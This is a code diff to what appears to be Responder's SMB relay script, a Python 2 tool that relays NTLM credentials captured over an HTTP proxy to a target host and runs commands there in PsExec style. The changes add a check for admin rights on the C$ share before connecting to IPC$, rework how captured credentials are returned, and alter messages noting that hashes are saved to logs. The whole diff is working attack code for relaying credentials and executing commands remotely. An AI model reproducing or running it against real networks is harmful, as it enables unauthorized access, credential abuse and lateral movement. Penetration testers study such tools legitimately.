@@ -271,14 +271,17 @@ def HTTPProxyRelay():
                 data = conn.recv(4096)
 
     except:
-        return None, None, None, None, None
+        return None
  
 
 def RunPsExec(Host):
 
-    data, s, clientIP, Username, Domain = HTTPProxyRelay()
-    if data == None:
+    GetCredentials = HTTPProxyRelay()
+
+    if GetCredentials  == None:
         return False
+
+    data, s, clientIP, Username, Domain = GetCredentials
 
     if data[8:10] == "\x73\x6d":
         print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target.\n[+] Hashes were saved anyways in Responder/logs/ folder."
@@ -288,11 +291,12 @@ def RunPsExec(Host):
         print "[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n"
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
 
+    ## First, check if user has admin privs on C$:    
     ## Tree Connect
     if data[8:10] == "\x73\x00":
         GetSessionResponseFlags(data)#Verify if the target returned a guest session.
         head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")
+        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\C$")
         t.calculate() 
         packet1 = str(head)+str(t)
         buffer1 = longueur(packet1)+packet1  
@@ -301,8 +305,19 @@ def RunPsExec(Host):
 
     ## Fail Handling.
     if data[8:10] == "\x75\x22":
-        print "[+] Tree Connect AndX denied. SMB Signing is likely mandatory on the target, or low privilege user.\n[+] Hashes were saved anyways in Responder/logs/ folder."
+        print "[+] Tree Connect AndX denied. SMB Signing is likely mandatory on the target, or this is a low privileged user.\n[+] Hashes were saved anyways in Responder/logs/ folder."
         return False
+
+    ## Tree Connect
+    if data[8:10] == "\x75\x00":
+        print "[+] Looks good, "+Username+" has admin rights on C$."
+        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")
+        t.calculate() 
+        packet1 = str(head)+str(t)
+        buffer1 = longueur(packet1)+packet1  
+        s.send(buffer1)
+        data = s.recv(2048)
 
     ## NtCreateAndx
     if data[8:10] == "\x75\x00":
@@ -310,7 +325,7 @@ def RunPsExec(Host):
 
     while True:
         if data[8:10] == "\x75\x00":
-            thread.start_new_thread(SMBKeepAlive, (s,data, 15)) #keep it alive every 15 secs.
+            #thread.start_new_thread(SMBKeepAlive, (s,data, 15)) #keep it alive every 15 secs.
             thread.start_new_thread(get_command, ())
             while Cmd == "":
                 pass
@@ -359,3 +374,4 @@ if __name__ == '__main__':
         main()
     except:
         raise
+
